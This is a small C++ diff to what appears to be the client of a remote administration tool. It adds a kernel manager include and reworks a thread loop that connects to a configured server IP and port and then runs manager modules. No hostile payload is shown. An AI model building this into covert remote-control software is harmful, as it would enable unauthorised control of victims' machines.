@@ -10,6 +10,7 @@
 #include "RegisterManager.h"
 #include "ServicesManager.h"
 #include "VideoManager.h"
+#include "KernelManager.h"
 
 extern char  g_szServerIP[MAX_PATH];
 extern unsigned short g_uPort;  
@@ -49,13 +50,15 @@ DWORD WINAPI ThreadProc(LPVOID lParam)
 
 template <class Manager, int n> DWORD WINAPI LoopManager(LPVOID lParam)
 {
-	IOCPClient	*ClientObject = (IOCPClient *)lParam;
+	ThreadInfo *pInfo = (ThreadInfo *)lParam;
+	IOCPClient	*ClientObject = pInfo->p;
 	if (ClientObject->ConnectServer(g_szServerIP,g_uPort))
 	{
 		Manager	m(ClientObject, n);
-		ClientObject->RunEventLoop();
+		ClientObject->RunEventLoop(pInfo->run);
 	}
 	delete ClientObject;
+	pInfo->p = NULL;
 
 	return 0;
 }
